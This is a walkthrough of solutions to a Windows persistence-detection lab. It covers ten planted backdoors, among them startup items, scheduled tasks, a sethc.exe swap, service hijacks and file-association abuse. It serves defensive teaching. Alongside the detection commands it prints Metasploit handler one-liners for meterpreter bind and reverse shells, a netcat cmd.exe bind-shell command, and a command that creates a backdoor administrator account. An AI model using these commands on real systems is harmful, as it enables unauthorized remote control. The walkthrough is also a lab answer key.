# Identifying Persistence Techniques Solutions

Here is a walkthrough for all ten persistence methods on the Persistence-VM:

|Method|Type|File|
|-|-|-|
|[Startup Folder and Registry Keys](#startup-folder-and-registry-keys)|startup|`C:\users\vm-user\appdata\roaming\microsoft\windows\start menu\programs\startup\scvhost.exe`|
|[Scheduled Tasks](#scheduled-tasks)|hourly|`C:\users\vm-user\Dev\tools\windows\winpmem\executable\binaries\malware_destroyer_v2.exe`|
|[Accessibility Features](#accessibility-features)|on click|`C:\windows\system32\sethc.exe`|
|[File and Folder Permissions](#file-and-folder-permissions)|on click|`C:\Program Files\7-Zip\7z.exe`|
|[Logon Scripts](#logon-scripts)|startup|`C:\NetLogon\launcher.bat`|
|[Shortcuts](#shortcuts)|on click|`C:\users\vm-user\documents\onenote notebooks\personal\mDNSresponder.exe`|
|[Service Registry Permissions](#service-registry-permissions)|delayed|`C:\users\public\Recorded TV\WinDefend.exe`| 
|[Service Permissions](#service-permissions)|delayed|`C:\Program.exe` (gupdate service)|
|[New Service](#new-service)|startup|`C:\windows\system32\nc.exe`|
|[Default File Associations](#default-file-associations)|on click|`C:\users\vm-user\appdata\local\temp\bind.exe`|

## Startup Folder and Registry Keys

Programs in a user's Startup folder and Registry Run keys will execute
when the user logs in. 

Typing  `wmic startup get` shows a suspicious program that executes at
startup:

`scvhost    Startup`

Using `ps -name scvhost | select path` shows its pid and full path:

```powershell
<pid>     C:\Users\vm-user\Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\scvhost.exe
```

Using `netstat -ano | findstr <pid>` shows it is holding port
34567 open:

```powershell
TCP        0.0.0.0:34567     0.0.0.0:0    LISTENING          <pid>
```

Connect to it with netcat and nothing happens.  It is listening for
something but we don't know what...

**ANALYSIS:**

The program opens a port on the system, is configured to execute at
startup, and attempts to blend in with legitimate "svchost" processes. 
Doesn't respond to connections initiated with `netcat`, most likely
listening for a more advanced tool.

**ANSWER:**

This persistence method allows an attacker to obtain a meterpreter shell
with:

```bash
msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/bind_tcp; set RHOST 192.168.2.114; set LPORT 34567; run'
```

## Scheduled Tasks

Tasks can be created to execute a malicious program on system startup or
at certain days and times. 

Typing `schtasks` shows a malware_scan task

Getting more info with `schtasks /query /TN malware_scan /v /FO list`
shows it is scheduled to run hourly and also the location of the file:

`C:\Users\vm-user\Dev\tools\windows\winpmem\executable\binaries\malware_destroyer_v2.exe`

Typing `ps | measure-object` , then starting the file, and then
running `ps | measure-object` again shows the file starts a process

Typing `ps` shows the process it started:

**malware_destroyer_v2** along with its pid

Running `netstat -ano | findstr <pid>`  shows it's listening on
port 9876:

```powershell
TCP        0.0.0.0:9876        0.0.0.0:0    LISTENING          <pid>
```

Connect to it with `netcat` and nothing happens.  It is listening for
something but we don't know what...

**ANALYSIS:**

The program opens a port on the system, is configured to execute every
hour, and attempts to blend in by appearing to be a malware scanner.  It
doesn't respond to connections initiated with netcat, most likely
listening for a more advanced tool.

**ANSWER:**

This persistence method allows an attacker to obtain a meterpreter shell
with:

```bash
msfconsole -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/bind_tcp; set RHOST 192.168.2.114; set LPORT 9876; run'
```

## Accessibility Features

There are several accessibility features that can be abused by an
attacker to maintain access to a system. 

Utilman.exe and sethc.exe are the two most well-known accessibility
features.  Checking file properties of each with `gp <filename> | select -pr *` shows `sethc.exe` is actually `cmd.exe`:

Version Info: 

|||
|-|-|
|File|`C:\windows\system32\sethc.exe`|
|InternalName|cmd|
|OriginalFilename|Cmd.Exe|
|FileDescription|Windows Command Processor|

**ANALYSIS:**

The sethc.exe program has been replaced by the cmd.exe executable.  Any
user who initiates accessibility features will instead initiate a
command shell on the system.

**ANSWER:**

This persistence method allows an attacker to obtain a SYSTEM shell by
pressing the SHIFT key five times.


## File and Folder Permissions

If a program uses a file or folder that has weak permissions, an
attacker can overwrite a legitimate program file with a malicious one. 

Running `icacls 'C:\Program Files\*' | findstr Everyone` shows
there is a program folder that allows anyone to write or modify its
contents:

`C:\Program Files\7-Zip     Everyone: (OI)(CI)(M)`

Running `gci 'C:\Program Files\7-Zip' | sort lastwritetime -desc` 
shows the binary was added or changed recently

Checking file properties of 7z.exe with `gp 'C:\Program Files\7-Zip\7z.exe' | select -pr *` shows it has no version info
which is suspicious

Typing `ps | measure-object` , then starting the file, then running
`ps | measure-object` again shows the file starts a process

Typing `ps` shows it starts a process called 7z and also shows its pid

Typing `netstat -ano | findstr <pid>`  shows the process sent a
SYN to port 22222 on the attacker's machine:

```powershell
TCP        192.168.2.114:49161         192.168.2.110:22222        SYN_SENT           <pid>
```

Directing the victim to a host with `netcat` listening on port 22222 shows
it is trying to make an HTTPS connection.

**ANALYSIS:**

The 7z.exe program has been replaced by a malicious executable because
the 7-Zip folder was world-writable.  When executed, the file starts a
process that attempts to connect to a port on the attacker's machine via
HTTPS.

**ANSWER:**

This persistence method allows an attacker to obtain a meterpreter shell
with:

```bash
msfconsole -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_https;set LHOST 192.168.2.110;set LPORT 22222;run'
```

## Logon Scripts

A logon script can be configured to run whenever a user logs onto a
system. 

Use `sudo tcpdump -i eth0 host 192.168.2.114 -w outputfile.pcap` to
capture traffic coming to the "attacker's host" when the user logs in:

This shows 3 connection attempts to 192.168.2.110.9999.

Set up a netcat listener using `sudo nc -nlvp 9999` and log out and
back in again.

On the listener for 9999, I observed an HTTP GET request for `/index.asp` coming from source port 49159.

Now a `netstat -ano` on the host shows these connections and the PIDs
of the processes initiating them.  You'll need to work fast before this
process drops gives up on the connection and exits...

`wmic process where processid=<pid> list full` on the host gives us
information about the process:

`powershell.exe       (Long encoded command line argument)    PPID of 1724 (exited)`

Decoding the Base64 string and decompressing the binary shows this is
most likely a PowerShell Empire implant running in memory. 

We need to know what started the PowerShell process.  There are several
tools that can be used to find this but I chose to use Sysmon64 from the
SysInternals Suite.  I started SysMon logging by using `sysmon64.exe -accepteula -i` and logged out and back in again.

This time, checking the Sysmon logs in EventViewer shows the powershell
process along with how it was started:

`EventID=1 Process Creation`

`ParentCommandLine:  cmd /c \\Vm-user-pc\netlogon\launcher.bat`


**ANALYSIS:**

The `launcher.bat` file is configured to start a hidden, encoded
powershell process when the user logs on.  This process is
memory-resident and makes a GET request to the attacker's machine on
port 9999 to initiate its C2.  The URI's, encoding, and other metadata
observed indicates this is a PowerShell Empire agent. 

**ANSWER:**

This persistence method allows an attacker to control a system over HTTP
via a PowerShell Empire implant.

## Shortcuts

A shortcut for a legitimate program can be modified and used to open a
malicious program when accessed by a user. 

Get a list of the user's shortcut files using `gci -r -fo -include "*.lnk" 2>$null c:\users\vm-user | select fullname`

This returns over 200 files.

We can sort that list by lastwritetime by using `gci -r -fo -include "*.lnk" 2>$null c:\users\vm-user | select lastwritetime,fullname | sort lastwritetime -desc | more`

Now you have ten or twelve files that have been recently accessed or
modified.  To only return files with a lastwritetime in February, we can
filter the results by using `gci -r -fo -include "*.lnk" 2>$null c:\users\vm-user | select lastwritetime,fullname | ?
{$_.lastwritetime -ge "1/31/17"} |  select fullname`

Starting with the most recently-written, check to see where each of
these shortcuts really points by either opening the file with notepad or
browsing to the file and right clicking and selecting "Properties." 
This will reveal a file that points to a suspicious location:

`C:\users\vm-user\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Mozilla Firefox.lnk`

Points to:

`C:\users\vm-user\Documents\OneNoteNotebooks\Personal\mDNSresponder.exe`

Now we can execute the suspicious file and see what it does...

For this I had Process Explorer open and saw the mDNSresponder process
start and located its PID.  

Then using `netstat -ano | findstr <pid>` showed it was trying to connect to port 5353 on the attacker's machine:

```powershell
TCP        192.168.2.114:49165         192.168.2.110:5353          SYN_SENT           <pid>
```

When a three way handshake couldn't be made, the program crashed.

Setting up a listener on port 5353 shows the malware connects and waits
for something but we don't know what.

Trying a few different payloads with Metasploit handler will reveal it
creates a reverse TCP shell for the attacker.

**ANALYSIS:**

The program is configured to execute when the TaskBar FireFox shortcut
is clicked, attempting to hide behind a legitimate program.  When
executed, the program makes an outbound connection to port 5353 on the
attacker's machine searching for a reverse TCP meterpreter shell
handler.

**ANSWER:**

This persistence method allows an attacker to obtain a meterpreter shell
with:

```bash
console -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.2.110; set LPORT 5353; run'
```

## Service Registry Permission

If an attacker can modify registry keys, the image path value of a
service can be changed to point to a different executable.

Service registry values are located at `HKLM:\System\CurrentControlSet\Services`.  Use `gci
HKLM:\System\CurrentControlSet\Services` to list all services.

Use `cd HKLM:\System\CurrentControlSet\Services` to navigate to the
service registry keys

To see the properties of a service, use `gp <service>`

We want to see image paths for each service.  Do this using `gp * | select PSChildName,ImagePath | ft -auto`

Look through the results for service binaries at odd locations (user
profiles, temp folders, non-system32, etc).

You can filter out the string "system32" using `gp * | select PSChildName,ImagePath | ft -auto | findstr /v /i system32`

Looking through the results shows a suspicious service with its binary
located in an unusual folder:

`WinDefend        C:\Users\Public\Recorded TV\WinDefend.exe`

Use `gp windefend` to show that "Start" is set to type 2 which means
it starts automatically and "DelayedAutoStart" is set to 1 which means
it actually starts two minutes after startup.

Executing the file while watching it in Process Explorer shows it starts
up and immediately exits.  It can't be associated to any network
activity or listening ports.

Running SysInternals tool "strings" with `strings WinDefend.exe` shows
a very suspicious string inside the file:

`cmd.exe /c net user local_admin Metasploit$1 /ADD && net localgroup Administrators local_admin /ADD`

This creates a user named local_admin and adds the new user to the
Administrators group. 

**ANALYSIS:**

The ImagePath registry value of the WinDefend service was changed to
point to a malicious program.  The service is configured to execute
automatically with a delayed start which allows the attacker's program
to run after every startup.  When executed, the program creates a new
user with local administrative privileges that the attacker can use to
control the victim host.

**ANSWER:**

This persistence method allows an attacker to control the host with what
appears to be a legitimate local admin account.

## Service Permissions

If an attacker can modify a service, the binary path can be changed to
any executable on the system. 

Typing `gwmi win32_service | select name,status,pathname  | ft -auto` shows the binary paths for each service.

Typing `gwmi win32_service | select name,status,pathname | ft -auto | findstr /v /i system32`  filters out many of the legitimate
results.

One service binary that sticks out is:

`gupdate       Stopped               C:\Program.exe`

Get more information about the service is by typing `Get-Service gupdate | select -pr *`

This is the Google Update Service which is configured for an automatic,
delayed start.  Program.exe looks like the wrong binary path for this
service.

Executing the suspicious file while watching SysInternals Process
Explorer shows the name of its process and its PID.

Typing `netstat -ano | findstr <pid>` shows the process attempts
to connect to port 8888 on the attacker's machine:

```powershell
TCP        192.168.2.114:49173        192.168.2.110:8888          SYN_SENT           <pid>
```

Setting up a listener on port 8888 shows the malware connects and sends
the following:

```powershell
GET /PbpaQubt-wZDXEJeG__dFwEGo979rf40fkDGlUz7NKA387KA-q8cPw29iivd0cn85Bsq4KlG7v70WNbLVFExgreHmxZvyhDS HTTP/1.1
Host:  192.168.2.110:8888
Cache-Control:  no-cache
```

This also looks suspicious and indicates the malware is attempting to
provide some type of reverse HTTP shell to the attacker.

**ANALYSIS:**

The binary path value of the Google Update Service was changed to point
to a malicious program.  The service is configured to execute
automatically with a delayed start which allows the attacker's program
to run after every startup.  When executed, the program connects to port
8888 on the attacker's machine and requests an unknown resource via
HTTP.  This is most likely an attempt to provide a reverse HTTP shell to
the attacker.

**ANSWER:**

This persistence method allows an attacker to obtain a reverse HTTP
meterpreter shell with:

```bash
msfconsole -x 'use multi/handler;set payload windows/x64/meterpreter/reverse_http;set LHOST 192.168.2.110;set LPORT 8888;run'
```

## New Service

A new service can be created and configured by an attacker to execute at
startup.

Using `gwmi win32_service | select name,status,pathname | ft -auto | findstr /v /i system32`  again shows services that use suspicious
arguments such as:

```powershell
GoogleUpdates          Stopped    C:\users\vm-user\appdata\local\GoogleUpdate.exe -dlp 50115 -e cmd.exe
```

Obtaining the MD5 hash of the file using `certutil -hashfile GoogleUpdate.exe MD5`  allows us to verify with several malware
analysis sites that this program is actually `netcat`:

`nc.exe      E0FB946C00B140693E3CF5DE258C22A1`

Executing the file shows it opens port 50115 on the victim and presents
a command shell when someone connects to it.

Gathering information on the service shows it is configured to start
manually.  So how does this service restart after reboots?

Running SysInternals tool "Autoruns" by typing `autorunsc.exe -accepteula -m` shows this service is configured to auto-start using
a registry key:

In the `HKLM\SOFTWARE\Microoft\Windows\CurrentVersion\Run`:

```powershell
GooglesUpdaters       C:\windows\system32\nc.exe -Ldp 50115 -e cmd.exe
```

**ANALYSIS:**

The program opens a port on the system, is configured to auto-start
using a registry key, and allows an attacker to connect to the port and
control the victim using the provided command shell.

**ANSWER:**

This persistence method allows an attacker to obtain a command shell by
connecting to port 50115 on the victim.

## Default File Associations

Default programs are used to open certain file types.  These can be
changed so that an arbitrary program is called when a specific file type
is opened.

Double clicking on answers.txt does not open the file, but seems to run
something else.  Running the command `assoc | findstr txt=` shows
text files are configured to be treated as PowerShell scripts:

`.txt=Microsoft.PowerShellscript.1`

This indicates something with the file associations for text files has
been changed.  Check the file properties on `answers.txt` and see what
application it's configured to open it.

`Opens with:       bind.exe`

Typing `ps` in powershell shows a process named bind and its pid. 
Typing `netstat -ano | findstr <pid>` shows the process is
listening on port 65000:

```powershell
TCP        [::]:65000             [::]:0         LISTENING          <pid>
```

Typing `wmic process where processid=<pid> list full` shows process
information including the CommandLine:

```powershell
CommandLine="C:\Users\vm-user\AppData\Local\Temp\bind.exe" "C:\Users\vm-user\Desktop\answers.txt"
```

This Commandline value has two arguments--the malicious `bind.exe` and
the `answers.txt` file on the Desktop.  Now we can see how the process was
started...

If you set the "Opens with" program back to Notepad.exe and double-click
the file, you'll see it starts a process that also has two arguments: 
The program opening the file and the file itself:

```powershell
CommandLine="C:\Windows\System32\notepad.exe" "C:\Users\vm-user\Desktop\answers.txt"
```

So just substituting the default program that opens a file will cause
the attacker's program to run when the file is executed.  

The default program for text files can also be identified with powershell by typing
`cd HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.txt` and then `gp OpenWithList`:

```powershell
(default)              c:\users\vm-user\appdata\local\temp\bind.exe
```

**ANALYSIS:**

The program opens a port on the system, is configured to start when the
user executes any text file, and allows an attacker to connect to the
open port and control the victim host using the provided command shell.

**ANSWER:**

This persistence method allows an attacker to obtain a meterpreter ipv6
bind shell with:

```bash
msfconsole -x 'use multi/handler;set payload windows/x64/meterpreter/bind_ipv6_tcp;set LPORT 65000;set RHOST 2602:304:af32:ec29:24b9:91e3:a0c0:5369;run'
```
